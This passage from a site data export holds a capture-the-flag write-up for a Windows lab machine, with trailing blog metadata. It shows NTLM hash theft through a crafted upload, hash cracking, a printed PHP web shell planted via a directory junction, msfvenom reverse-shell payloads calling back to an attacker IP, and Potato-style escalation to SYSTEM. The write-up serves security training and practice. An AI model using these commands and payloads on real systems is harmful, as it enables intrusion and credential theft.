<code>.wax</code> file is executed by a user on the backend of the machine, it poison the request and direct it to our MITM server that we stand up.</p>\n<p>To start, we’ll boot up Responder in a separate terminal tab.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ sudo responder -I tun0</span><br><span class=\"line\">                                         __</span><br><span class=\"line\">  .----.-----.-----.-----.-----.-----.--|  |.-----.----.</span><br><span class=\"line\">  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|</span><br><span class=\"line\">  |__| |_____|_____|   __|_____|__|__|_____||_____|__|</span><br><span class=\"line\">                   |__|</span><br><span class=\"line\"></span><br><span class=\"line\">           NBT-NS, LLMNR &amp; MDNS Responder 3.1.4.0</span><br><span class=\"line\">......</span><br><span class=\"line\">[+] Listening for events...</span><br></pre></td></tr></table></figure>\n\n<p>Next, we’ll generate a few files using Greenwolf’s NTLM theft file generation <a href=\"https://github.com/Greenwolf/ntlm_theft\">here</a>. There is an abundance of different file formats you can use, however we’ll be using the <code>.wax</code> file type in our case.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ python3 ntlm_theft.py -g wax -s 10.8.0.173 -f daz</span><br><span class=\"line\">Created: daz/daz.wax (OPEN)</span><br><span class=\"line\">Generation Complete.</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ ls -la daz       </span><br><span class=\"line\">total 12</span><br><span class=\"line\">drwxrwxr-x 2 daz daz 4096 Aug  7 22:10 .</span><br><span class=\"line\">drwxrwxr-x 7 daz daz 4096 Aug  7 22:10 ..</span><br><span class=\"line\">-rw-rw-r-- 1 daz daz   54 Aug  7 22:10 daz.wax</span><br></pre></td></tr></table></figure>\n\n<p>All that’s left now is to transfer this file via the file upload functionality and wait for any NTLM hash exchanges that are captured in Responder.</p>\n<p>After about a minute or two of waiting, you should see a successfully captured hash appear.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">[+] Listening for events...                                                                                                   </span><br><span class=\"line\"></span><br><span class=\"line\">[SMB] NTLMv2-SSP Client   : 10.10.115.42</span><br><span class=\"line\">[SMB] NTLMv2-SSP Username : MEDIA\\enox</span><br><span class=\"line\">[SMB] NTLMv2-SSP Hash     : enox::MEDIA:6698cf0238d6cc81:A7112EF24883911141FD714144D4B6FB:010100000000000000F00E5716E9DA014E8B[...snip...]0000000000                                          </span><br><span class=\"line\">[*] Skipping previously captured hash for MEDIA\\enox</span><br><span class=\"line\">[*] Skipping previously captured hash for MEDIA\\enox</span><br></pre></td></tr></table></figure>\n\n<p>We’ll crack this using hashcat along with its hash-identifier, which is 5600 for NetNTLM-v2 hashes.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ hashcat -a 0 -m 5600 enox_hash.txt /usr/share/wordlists/rockyou.txt </span><br><span class=\"line\">hashcat (v6.2.6) starting</span><br><span class=\"line\">......</span><br><span class=\"line\">310030002e0038002e0030002e003100370033000000000000000000:[...snip...]</span><br><span class=\"line\"></span><br><span class=\"line\">Session..........: hashcat</span><br><span class=\"line\">Status...........: Cracked</span><br><span class=\"line\">Hash.Mode........: 5600 (NetNTLMv2)</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, we were successfully able to crack the hash for the <code>enox</code> user and can now use it to enumerate the target machine.</p>\n<p>Given that we now have credentials and there isn’t any form of LDAP or Kerberos on this machine, let’s just test a simple authentication attempt through SSH.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ ssh enox@10.10.115.42</span><br><span class=\"line\">enox@10.10.115.42&#x27;s password:</span><br><span class=\"line\">Microsoft Windows [Version 10.0.20348.1970]</span><br><span class=\"line\">(c) Microsoft Corporation. All rights reserved.</span><br><span class=\"line\"></span><br><span class=\"line\">enox@MEDIA C:\\Users\\enox&gt;</span><br></pre></td></tr></table></figure>\n\n<p>The first user flag is within the <code>enox</code> user’s Desktop directory in their home folder.</p>\n<h1 id=\"Host-Reconnaissance\"><a href=\"#Host-Reconnaissance\" class=\"headerlink\" title=\"Host Reconnaissance\"></a>Host Reconnaissance</h1><p>Now that we have shell access as a user on the machine, let’s look around a bit. As I said before, there isn’t any form of LDAP or Kerberos on this machine, so our privilege escalation should rely and be exploiting completely through the shell that we currently have access to.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\&gt; ls</span><br><span class=\"line\"></span><br><span class=\"line\">Directory: C:\\</span><br><span class=\"line\"></span><br><span class=\"line\">Mode                 LastWriteTime         Length Name</span><br><span class=\"line\">----                 -------------         ------ ----</span><br><span class=\"line\">d-----          5/8/2021   1:20 AM                PerfLogs</span><br><span class=\"line\">d-r---        10/10/2023   6:32 AM                Program Files</span><br><span class=\"line\">d-----          5/8/2021   2:40 AM                Program Files (x86)</span><br><span class=\"line\">d-r---         10/2/2023  10:26 AM                Users</span><br><span class=\"line\">d-----        10/10/2023   6:41 AM                Windows</span><br><span class=\"line\">d-----         10/2/2023  11:03 AM                xampp</span><br></pre></td></tr></table></figure>\n\n<p>The <code>C:\\</code> drive does not seem to have anything obscenely useful in our case, as the <code>xampp</code> server is the webserver that we previously exploited.</p>\n<p>The first thing that jumped out to me (since we don’t seem to have any exploitable privileges) is the <code>xampp</code> webserver directory itself. Generally, files within a <code>xampp</code> webserver are hosted within <code>C:\\xampp\\htdocs</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\xampp\\htdocs&gt; echo &#x27;test&#x27; &gt; test.txt</span><br><span class=\"line\">out-file : Access to the path &#x27;C:\\xampp\\htdocs\\test.txt&#x27; is denied.</span><br><span class=\"line\">At line:1 char:1</span><br><span class=\"line\">+ echo &#x27;test&#x27; &gt; test.txt</span><br><span class=\"line\">+ ~~~~~~~~~~~~~~~~~~~~~~</span><br><span class=\"line\">    + CategoryInfo          : OpenError: (:) [Out-File], UnauthorizedAccessException</span><br><span class=\"line\">    + FullyQualifiedErrorId : FileOpenFailure,Microsoft.PowerShell.Commands.OutFileCommand</span><br></pre></td></tr></table></figure>\n\n<p>However as you’ll notice, it does not seem as though we have write access to this directory. At this point there wouldn’t be any form</p>\n<p>Something that also stood out to me after a bit of filesystem enumeration was how the <code>.wax</code> files were processed on the backend. In regular cases, this would generally be a user or a group of people from the team. There is however, a script to automate this in <code>C:\\Users\\enox\\Documents</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Users\\enox\\Documents&gt; cat review.ps1</span><br><span class=\"line\">......</span><br><span class=\"line\">$todofile=&quot;C:\\\\Windows\\\\Tasks\\\\Uploads\\\\todo.txt&quot;</span><br><span class=\"line\">$mediaPlayerPath = &quot;C:\\Program Files (x86)\\Windows Media Player\\wmplayer.exe&quot;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">while($True)&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    if ((Get-Content -Path $todofile) -eq $null) &#123;</span><br><span class=\"line\">        Write-Host &quot;Todo is empty.&quot;</span><br><span class=\"line\">        Sleep 60 # Sleep for 60 seconds before rechecking</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>The interesting part is the <code>todofile</code> that is being commit to a variable name. Browsing to this file in <code>C:\\Windows\\Tasks\\Uploads</code> looks to have nothing in it, so we can assume that this text file is only populated when the review script is being ran.</p>\n<p>However in this directory, you’ll notice that there are a few directories alongside the text file. These directories may differ from you, as they seem to be relative to the uploaded file itself.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Windows\\Tasks\\uploads&gt; ls</span><br><span class=\"line\"></span><br><span class=\"line\">Directory: C:\\Windows\\Tasks\\uploads</span><br><span class=\"line\"></span><br><span class=\"line\">Mode                 LastWriteTime         Length Name</span><br><span class=\"line\">----                 -------------         ------ ----                                                </span><br><span class=\"line\">d-----          8/7/2024   7:12 PM                0c2d658dbb1000cd0c070a16447a30d4</span><br><span class=\"line\">d-----          8/7/2024   7:52 PM                ca7a9f126960f1046ff6e022339b54bd</span><br><span class=\"line\">-a----          8/7/2024   7:52 PM             70 todo.txt</span><br></pre></td></tr></table></figure>\n\n<p>I did some research into the review script itself to determine if this directory name that is created is based off any properties, and it seems to be static.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"># Read the first line of the file</span><br><span class=\"line\">$firstLine = Get-Content $FilePath -TotalCount 1</span><br><span class=\"line\"></span><br><span class=\"line\"># Extract the values from the first line</span><br><span class=\"line\">if ($firstLine -match &#x27;Filename: (.+), Random Variable: (.+)&#x27;) &#123;</span><br><span class=\"line\">    $filename = $Matches[1]</span><br><span class=\"line\">    $randomVariable = $Matches[2]</span><br><span class=\"line\"></span><br><span class=\"line\">    # Create a custom object with the extracted values</span><br><span class=\"line\">    $repoValues = [PSCustomObject]@&#123;</span><br><span class=\"line\">        FileName = $filename</span><br><span class=\"line\">        RandomVariable = $randomVariable</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n\n<p>The “randomVariable” variable seems to be static as far as I’m concerned, as there are no hashing algorithms that are used in the above code snippet. With this in mind, I decided to try and upload the same file twice through the web application.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">Mode                 LastWriteTime         Length Name</span><br><span class=\"line\">----                 -------------         ------ ----</span><br><span class=\"line\">d-----          8/7/2024   7:12 PM                0c2d658dbb1000cd0c070a16447a30d4</span><br><span class=\"line\">d-----          8/7/2024   7:52 PM                ca7a9f126960f1046ff6e022339b54bd</span><br><span class=\"line\">-a----          8/7/2024   7:53 PM              0 todo.txt</span><br><span class=\"line\"></span><br><span class=\"line\">Mode                 LastWriteTime         Length Name</span><br><span class=\"line\">----                 -------------         ------ ----</span><br><span class=\"line\">d-----          8/7/2024   7:12 PM                0c2d658dbb1000cd0c070a16447a30d4</span><br><span class=\"line\">d-----          8/7/2024   8:26 PM                ca7a9f126960f1046ff6e022339b54bd</span><br><span class=\"line\">-a----          8/7/2024   8:26 PM             70 todo.txt</span><br><span class=\"line\"></span><br><span class=\"line\">PS C:\\Windows\\Tasks\\Uploads&gt; cat todo.txt</span><br><span class=\"line\">Filename: daz.aspx, Random Variable: ca7a9f126960f1046ff6e022339b54bd</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, it seems as though the directory that is created is a random variable, however it is static dependent on the name of the file itself. Furthermore, the <code>todo.txt</code> file is populated during the file upload process and further cements the name of the directory.</p>\n<h1 id=\"Exploiting-Arbitrary-Write-Privileges-via-Symlinks\"><a href=\"#Exploiting-Arbitrary-Write-Privileges-via-Symlinks\" class=\"headerlink\" title=\"Exploiting Arbitrary Write Privileges via Symlinks\"></a>Exploiting Arbitrary Write Privileges via Symlinks</h1><p>With that being said, there is an interesting exploit that we can perform. This involves creating a symlink, which is one of the more common ways that a lot of hackers exploit privilege escalation on Windows and Linux machines.</p>\n<p>A symlink is essentially a link between two objects on a filesystem. This can be files, directories, users, however generally when we refer to symlinks on filesystems we are noting the link of directories. This is similar to how mounts work in NFS shares, however this all occurs internally on the machine itself.</p>\n<p>Creating a symlink for a directory is relatively easy and involves utilizing the <code>mklink</code> command. We’ll specify the name of a directory that we want to establish the link on, and then the target directory we want it to be linked to. This will essentially function like a mount - meaning that all files that are created within the first directory will be automatically uploaded to the second directory at the endpoint of the symlink and vice versa. You can find more information about symlinks <a href=\"https://nixhacker.com/understanding-and-exploiting-symbolic-link-in-windows/\">here</a>.</p>\n<p>Since we know that the file specifically creates a static name for the directory, we can use this to create a symlink between objects (directories in our case) that are created with the specific name and link it to another directory. We can essentially send this anywhere, however in our case let’s try to specifically deliver it to the <code>C:\\xampp\\htdocs</code> directory that we previously did not have access to.</p>\n<p>Let’s first create a simple web shell and upload it via the web application upload functionality. You can find the webshell that I used below from <a href=\"https://www.revshells.com/\">revshells.com</a>.</p>\n<figure class=\"highlight php\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;html&gt;</span><br><span class=\"line\">&lt;body&gt;</span><br><span class=\"line\">&lt;form method=<span class=\"string\">&quot;GET&quot;</span> name=<span class=\"string\">&quot;&lt;?php echo basename(<span class=\"subst\">$_SERVER</span>[&#x27;PHP_SELF&#x27;]); ?&gt;&quot;</span>&gt;</span><br><span class=\"line\">&lt;input type=<span class=\"string\">&quot;TEXT&quot;</span> name=<span class=\"string\">&quot;cmd&quot;</span> id=<span class=\"string\">&quot;cmd&quot;</span> size=<span class=\"string\">&quot;80&quot;</span>&gt;</span><br><span class=\"line\">&lt;input type=<span class=\"string\">&quot;SUBMIT&quot;</span> value=<span class=\"string\">&quot;Execute&quot;</span>&gt;</span><br><span class=\"line\">&lt;/form&gt;</span><br><span class=\"line\">&lt;pre&gt;</span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>(<span class=\"keyword\">isset</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cmd&#x27;</span>]))</span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"title function_ invoke__\">system</span>(<span class=\"variable\">$_GET</span>[<span class=\"string\">&#x27;cmd&#x27;</span>]);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"><span class=\"meta\">?&gt;</span></span><br><span class=\"line\">&lt;/pre&gt;</span><br><span class=\"line\">&lt;/body&gt;</span><br><span class=\"line\">&lt;script&gt;document.<span class=\"title function_ invoke__\">getElementById</span>(<span class=\"string\">&quot;cmd&quot;</span>).<span class=\"title function_ invoke__\">focus</span>();&lt;/script&gt;</span><br><span class=\"line\">&lt;/html&gt;</span><br></pre></td></tr></table></figure>\n\n<p>After this file is uploaded to the <code>Uploads</code> directory, let’s grab the name of the directory that is created.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Windows\\Tasks\\Uploads&gt; cat .\\todo.txt</span><br><span class=\"line\">Filename: webshell.php, Random Variable: a5f9e4b2c2e61ae07ffaec35aa299a7d</span><br></pre></td></tr></table></figure>\n\n<p>After this, I deleted the folder after it was created, as we have the “random” variable that is created. We can then use <code>mklink</code> to create a symbolic link between the name of the folder that will be created and the <code>C:\\xampp\\htdocs</code> directory.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Windows\\Tasks\\Uploads&gt; cmd /c &quot;mklink /J a5f9e4b2c2e61ae07ffaec35aa299a7d C:\\xampp\\htdocs&quot;</span><br><span class=\"line\">Junction created for a5f9e4b2c2e61ae07ffaec35aa299a7d &lt;&lt;===&gt;&gt; C:\\xampp\\htdocs</span><br></pre></td></tr></table></figure>\n\n<p>Remember that <code>mklink</code> is a CMD-specific command, meaning it will be unrecognized by PowerShell.</p>\n<p>Now that the link has been established, we’ll reupload the webshell with the same properties as we did previously. After it is uploaded, we’ll check <code>C:\\xampp\\htdocs</code> to see if the link worked accordingly.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\Windows\\Tasks\\Uploads&gt; cd C:\\xampp\\htdocs</span><br><span class=\"line\">PS C:\\xampp\\htdocs&gt; ls</span><br><span class=\"line\"></span><br><span class=\"line\">Directory: C:\\xampp\\htdocs</span><br><span class=\"line\"></span><br><span class=\"line\">Mode                 LastWriteTime         Length Name           </span><br><span class=\"line\">----                 -------------         ------ ----</span><br><span class=\"line\">d-----         10/2/2023  10:27 AM                assets</span><br><span class=\"line\">d-----         10/2/2023  10:27 AM                css</span><br><span class=\"line\">d-----         10/2/2023  10:27 AM                js</span><br><span class=\"line\">-a----        10/10/2023   5:00 AM          20563 index.php</span><br><span class=\"line\">-a----          8/7/2024   8:40 PM            348 webshell.php</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, the webshell was uploaded successfully via the symlink! We were able to essentially write a webshell onto a directory that we previously did not have access to.</p>\n<p>If we browse to the PHP file path, you’ll find that we have access to a command execution page.</p>\n<p><img src=\"/images/vulnlab/media-vl/e.png\"></p>\n<p>It seems that we now have command execution as the <code>LOCAL SERVICE</code> account, meaning we can execute a payload to receive a netcat reverse shell as this user. I opted to use the Base64 encoded PowerShell reverse shell from revshells.com.</p>\n<p><img src=\"/images/vulnlab/media-vl/f.png\"></p>\n<h1 id=\"Restoring-LOCAL-SERVICE-Privileges\"><a href=\"#Restoring-LOCAL-SERVICE-Privileges\" class=\"headerlink\" title=\"Restoring LOCAL SERVICE Privileges\"></a>Restoring LOCAL SERVICE Privileges</h1><p>Normally since we now have access to the <code>LOCAL SERVICE</code> account, we should theoretically have the <code>SeImpersonatePrivilege</code> and <code>SeAssignPrimaryToken</code> privileges. This would grant us the ability to perform auth coercion to SYSTEM via a malicious named pipe.</p>\n<p>However if you’ll notice from your privileges, it does not seem as though we have that specific privilege handy.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\xampp\\htdocs&gt; whoami /priv</span><br><span class=\"line\"></span><br><span class=\"line\">PRIVILEGES INFORMATION</span><br><span class=\"line\">----------------------</span><br><span class=\"line\"></span><br><span class=\"line\">Privilege Name                Description                         State   </span><br><span class=\"line\">============================= =================================== ========</span><br><span class=\"line\">SeTcbPrivilege                Act as part of the operating system Disabled</span><br><span class=\"line\">SeChangeNotifyPrivilege       Bypass traverse checking            Enabled </span><br><span class=\"line\">SeCreateGlobalPrivilege       Create global objects               Enabled </span><br><span class=\"line\">SeIncreaseWorkingSetPrivilege Increase a process working set      Disabled</span><br><span class=\"line\">SeTimeZonePrivilege           Change the time zone                Disabled</span><br></pre></td></tr></table></figure>\n\n<p>There is an easy fix for this, which involves restoring the default privileges set to the <code>LOCAL SERVICE</code> account. We can use <a href=\"https://github.com/itm4n/FullPowers.git\">this tool</a> created by itm4n, which will essentially perform the restoration for us.</p>\n<p>Let’s first create a MSFVENOM payload for another reverse shell, as we’ll need a new session as the restored <code>LOCAL SERVICE</code> account. I’ve been trying to practice exploiting machines without the use of C2’s, so we’ll just use regular netcat reverse shells for this.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ msfvenom -p windows/x64/shell_reverse_tcp -ax64 -f exe LHOST=10.8.0.173 LPORT=9002 &gt; daz.exe</span><br><span class=\"line\">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class=\"line\">No encoder specified, outputting raw payload</span><br><span class=\"line\">Payload size: 460 bytes</span><br><span class=\"line\">Final size of exe file: 7168 bytes</span><br></pre></td></tr></table></figure>\n\n<p>We’ll then transfer that to a directory on the remote filesystem using CURL onto your preferred directory (I made a directory within <code>C:\\temp</code>).</p>\n<p>We’ll then also CURL our compiled <code>FullPowers.exe</code> binary onto the host. This should leave us with the below two files.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\temp&gt; ls</span><br><span class=\"line\"></span><br><span class=\"line\">Directory: C:\\temp</span><br><span class=\"line\"></span><br><span class=\"line\">Mode                 LastWriteTime         Length Name                   </span><br><span class=\"line\">----                 -------------         ------ ----</span><br><span class=\"line\">-a----          8/7/2024   9:11 PM           7168 daz.exe</span><br><span class=\"line\">-a----          8/7/2024   9:12 PM          36864 FullPowers.exe</span><br></pre></td></tr></table></figure>\n\n<p>We can then execute <code>FullPowers</code> and generate a new session as <code>LOCAL SERVICE</code> with our privileges restored with the below command.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\temp&gt; .\\FullPowers.exe -c &#x27;C:\\temp\\daz.exe&#x27;</span><br></pre></td></tr></table></figure>\n\n<p><img src=\"/images/vulnlab/media-vl/g.png\"></p>\n<p>As you can see from the above, we now have <code>SeImpersonatePrivilege</code> and can exploit the SYSTEM auth coercion. I’ve explained this in a few other writeups, however I’ll give the rundown just for any new readers.</p>\n<p>Service accounts, by default, will have he <code>SeImpersonatePrivilege</code> token along with  <code>SeAssignPrimaryTokenPrivilege</code>. Having <code>SeImpersonatePrivilege</code> essentially allows our service account to impersonate a user or specified user to perform actions on behalf of that user. Exploiting this is relatively simple, as we can impersonate SYSTEM and authenticate to an evil named pipe that we create. We can direct this named pipe to a binary to execute, which will run in the context of SYSTEM.</p>\n<p>We can use the Potato family of exploits to perform this evil named pipe and auth coercion exploit. Generally if AV is enabled we’d have to use a specific Potato exploit, however that does not seem to be the case here. I’ll use <a href=\"https://github.com/CCob/SweetPotato\">SweetPotato</a> for our case here.</p>\n<p>We’ll generate another MSFVENOM reverse shell on port 9003 and start up a netcat listener beforehand.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ msfvenom -p windows/x64/shell_reverse_tcp -ax64 -f exe LHOST=10.8.0.173 LPORT=9003 &gt; daz2.exe </span><br><span class=\"line\">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class=\"line\">No encoder specified, outputting raw payload</span><br><span class=\"line\">Payload size: 460 bytes</span><br><span class=\"line\">Final size of exe file: 7168 bytes</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ rlwrap nc -lvnp 9003</span><br><span class=\"line\">listening on [any] 9003 ...</span><br></pre></td></tr></table></figure>\n\n<p>We’ll then bring our compiled SweetPotato binary over to the remote host via CURL and execute it on our most recent <code>LOCAL SERVICE</code> session.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\temp&gt; .\\SweetPotato.exe -p &#x27;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe&#x27; -a &#x27;C:\\temp\\daz2.exe&#x27; -e EfsRpc</span><br><span class=\"line\">SweetPotato by @_EthicalChaos_</span><br><span class=\"line\">  Orignal RottenPotato code and exploit by @foxglovesec</span><br><span class=\"line\">  Weaponized JuciyPotato by @decoder_it and @Guitro along with BITS WinRM discovery</span><br><span class=\"line\">  PrintSpoofer discovery and original exploit by @itm4n</span><br><span class=\"line\">  EfsRpc built on EfsPotato by @zcgonvh and PetitPotam by @topotam</span><br><span class=\"line\">[+] Attempting NP impersonation using method EfsRpc to launch C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe</span><br><span class=\"line\">[+] Triggering name pipe access on evil PIPE \\\\localhost/pipe/64a97836-d71d-4171-86fb-4ee82adf0794/\\64a97836-d71d-4171-86fb-4ee82adf0794\\64a97836-d71d-4171-86fb-4ee82adf0794</span><br><span class=\"line\">[+] Server connected to our evil RPC pipe</span><br><span class=\"line\">[+] Duplicated impersonation token ready for process creation</span><br><span class=\"line\">[+] Intercepted and authenticated successfully, launching program</span><br><span class=\"line\">[+] Process created, enjoy!</span><br></pre></td></tr></table></figure>\n\n<p>If we look at our reverse shell window, we can see that a shell was spawned as SYSTEM.</p>\n<p><img src=\"/images/vulnlab/media-vl/h.png\"></p>\n<p>Now that we have a shell as SYSTEM, this means we can effectively read the root flag in the Administrator’s Desktop directory, meaning we have completed this machine!</p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>This machine in particular was very fun, as the steps to learning symlinks was very helpful and is actually a relatively extensive vulnerability in terms of the actions that you can do. Initially, I had tried to create a symlink onto <code>C:\\Windows\\System32\\wbem</code> and hijack a DLL that is loaded when <code>systeminfo</code> is called, however it did not see as though that could be done. </p>\n<p>Regardless, this machine was great. Big props goes out to enox for creating it.</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://support.microsoft.com/en-us/topic/file-types-supported-by-windows-media-player-32d9998e-dc8f-af54-7ba1-e996f74375d9\">https://support.microsoft.com/en-us/topic/file-types-supported-by-windows-media-player-32d9998e-dc8f-af54-7ba1-e996f74375d9</a><br><a href=\"https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/\">https://osandamalith.com/2017/03/24/places-of-interest-in-stealing-netntlm-hashes/</a><br><a href=\"https://github.com/Greenwolf/ntlm_theft\">https://github.com/Greenwolf/ntlm_theft</a><br><a href=\"https://nixhacker.com/understanding-and-exploiting-symbolic-link-in-windows/\">https://nixhacker.com/understanding-and-exploiting-symbolic-link-in-windows/</a><br><a href=\"https://www.revshells.com/\">https://www.revshells.com/</a><br><a href=\"https://github.com/itm4n/FullPowers\">https://github.com/itm4n/FullPowers</a><br><a href=\"https://github.com/CCob/SweetPotato\">https://github.com/CCob/SweetPotato</a></p>\n"}],"PostAsset":[],"PostCategory":[{"post_id":"clx0t67qs0001t5uf01d6aobz","category_id":"clx0w93qb000067ufedeh9ivq","_id":"clx0w93qe000367uf5kxwfkcw"},{"post_id":"clx1em92e0000m2uf4tkx6xce","category_id":"clx0w93qb000067ufedeh9ivq","_id":"clx1em92k0003m2ufdvhs2lld"},{"post_id":"clx1f19ow0000ujufbfrucn4s","category_id":"clx0w93qb000067ufedeh9ivq","_id":"clx1f19p10003ujuf5frkfecb"},{"post_id":"clx1fcb3i0000w7ufc2v58hya","category_id":"clx0w93qb000067ufedeh9ivq","_id":"clx1fcb3n0003w7uf29j586f0"},{"post_id":"clx1flim10000m8uf6jl1ckbg","category_id":"clx0w93qb000067ufedeh9ivq","_id":"clx1flim70003m8ufg15x8ntd"},{"post_id":"clx24ijt60000iauf3kfs9jws","category_id":"clx0w93qb000067ufedeh9ivq","_id":"clx24sjm40003iauf0pmn3mla"},{"post_id":"clx25bdl600005euf7v8v1ct4","category_id":"clx0w93qb000067ufedeh9ivq","_id":"clx25bdla00035euf6z6b68l2"},{"post_id":"clx25k01g0000dbuf0icue0m7","category_id":"clx0w93qb000067ufedeh9ivq","_id":"clx25k01k0003dbufe4z0fzx8"},{"post_id":"clx25tzi00000mluf348z4xs0","category_id":"clx0w93qb000067ufedeh9ivq","_id":"clx25tzi40003mluf5tiu11u7"},{"post_id":"clx27nekq0000ojufdoj836kf","category_id":"clx0w93qb000067ufedeh9ivq","_id":"clx27neky0002ojuf1yb1bg19"},{"post_id":"clx298b4g00003quf2ydfe7ua","category_id":"clx0w93qb000067ufedeh9ivq","_id":"clx298b4w00033quff0yza8l4"},{"post_id":"clx29mygk0000g4ufep4t95ek","category_id":"clx0w93qb000067ufedeh9ivq","_id":"clx2a4agn0001mnuf2nbpcrmz"},{"post_id":"clx2amfuw0000w8uf2ychh0z6","category_id":"clx0w93qb000067ufedeh9ivq","_id":"clx2amfv10003w8uf4phufs5e"},{"post_id":"clx2az5wx000081uffu7ggtes","category_id":"clx0w93qb000067ufedeh9ivq","_id":"clx2az5xf000381uf1xyw3wcl"},{"post_id":"clx2nhkel000069ufcm3yhlor","category_id":"clx2nhkeq000169ufd9asdzho","_id":"clx2nhkeu000569uf9f6xaqtf"},{"post_id":"clx2o5x710000hpuf1vk37qeq","category_id":"clx2nhkeq000169ufd9asdzho","_id":"clx2o5x760001hpuf4o5383tn"},{"post_id":"clxqttnri0000g5uf68he69yj","category_id":"clx0w93qb000067ufedeh9ivq","_id":"clxqttnrp0003g5ufc6vt43as"},{"post_id":"clxz6kn8100009uuffenrg92u","category_id":"clx0w93qb000067ufedeh9ivq","_id":"clxz6kn8800039uuf8roy8s6n"},{"post_id":"clxznjhrl00006muf11qxf3tb","category_id":"clx0w93qb000067ufedeh9ivq","_id":"clxznjhrq00036muf3bti5vu0"},{"post_id":"cly1tg7dz00007vuf8ghq4fy1","category_id":"clx0w93qb000067ufedeh9ivq","_id":"cly1tg7e300037vuf15bda6fc"},{"post_id":"cly6i0wne000080uf3r7keaqy","category_id":"clx0w93qb000067ufedeh9ivq","_id":"cly6i0wnh000380ufaddt3zx5"},{"post_id":"clyb4ywdi000085uf04zt27em","category_id":"clx0w93qb000067ufedeh9ivq","_id":"clyb4ywdn000385uf0qz15212"},{"post_id":"clyl4fcq500007quf7u3idsg4","category_id":"clx0w93qb000067ufedeh9ivq","_id":"clyl4fcqb00037quf61jq7ule"},{"post_id":"clylvx4by00007xufd3mreogp","category_id":"clx0w93qb000067ufedeh9ivq","_id":"clylvx4c400037xuffw0d6fc4"},{"post_id":"clzd67ybm0000atufed1z2ran","category_id":"clx0w93qb000067ufedeh9ivq","_id":"clzd67ybq0003atufgwaz03bj"},{"post_id":"clzlc8gnl0000d5uf5c1jgu6w","category_id":"clx0w93qb000067ufedeh9ivq","_id":"clzlc8gnr0003d5ufavltf3e1"}],"PostTag":[{"post_id":"clx0t67qs0001t5uf01d6aobz","tag_id":"clx0u1gtn0002ttuf0136cf17","_id":"clx0u1gtq000dttuf6043ggp4"},{"post_id":"clx0t67qs0001t5uf01d6aobz","tag_id":"clx0w93qc000167uf34i91h69","_id":"clx0w93qe000267ufd26751z7"},{"post_id":"clx1em92e0000m2uf4tkx6xce","tag_id":"clx0w93qc000167uf34i91h69","_id":"clx1em92j0001m2ufflmias4g"},{"post_id":"clx1em92e0000m2uf4tkx6xce","tag_id":"clx0u1gtn0002ttuf0136cf17","_id":"clx1em92j0002m2ufb5upbz53"},{"post_id":"clx1f19ow0000ujufbfrucn4s","tag_id":"clx0w93qc000167uf34i91h69","_id":"clx1f19p10001ujufduaxgkar"},{"post_id":"clx1f19ow0000ujufbfrucn4s","tag_id":"clx0u1gtn0002ttuf0136cf17","_id":"clx1f19p10002ujuf8sd62sgr"},{"post_id":"clx1fcb3i0000w7ufc2v58hya","tag_id":"clx0w93qc000167uf34i91h69","_id":"clx1fcb3m0001w7uf0ltl26ej"},{"post_id":"clx1fcb3i0000w7ufc2v58hya","tag_id":"clx0u1gtn0002t